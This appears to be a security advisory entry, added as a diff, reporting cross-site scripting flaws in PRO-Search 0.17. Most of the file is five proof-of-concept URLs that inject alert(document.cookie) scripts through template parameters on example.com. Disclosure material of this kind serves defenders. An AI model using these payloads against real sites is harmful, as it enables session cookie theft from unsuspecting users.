@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/27126/info
+
+PRO-Search is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+PRO-Search 0.17 is vulnerable; other versions may also be affected.
+
+http://www.example.com/templates/example_template.php?data[title]=%3C/title%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/templates/example_template.php?data[message]=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/templates/example_template.php?data[table][1][item]=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/templates/example_template.php?data[table][1][url]=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/templates/example_template.php?data[poweredby]=%3Cscript%3Ealert(document.cookie)%3C/script%3E
